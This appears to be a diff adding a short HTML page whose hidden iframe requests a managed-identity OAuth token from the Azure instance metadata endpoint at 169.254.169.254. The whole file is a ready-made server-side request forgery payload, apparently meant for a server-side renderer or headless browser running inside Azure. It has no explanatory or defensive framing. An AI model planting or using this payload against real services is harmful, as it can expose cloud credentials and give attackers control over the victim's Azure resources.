@@ -1,0 +1,11 @@
+<html>
+  <head>
+    <title>Fetch Azure Metadata via Iframe</title>
+  </head>
+  <body>
+    <h1>Fetching Azure Metadata via Iframe</h1>
+    <p>Attempting to fetch Azure metadata...</p>
+    <iframe src="http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" style="display:none;"></iframe>
+    <p>Check the browser console or network tab for the iframe response.</p>
+  </body>
+</html>
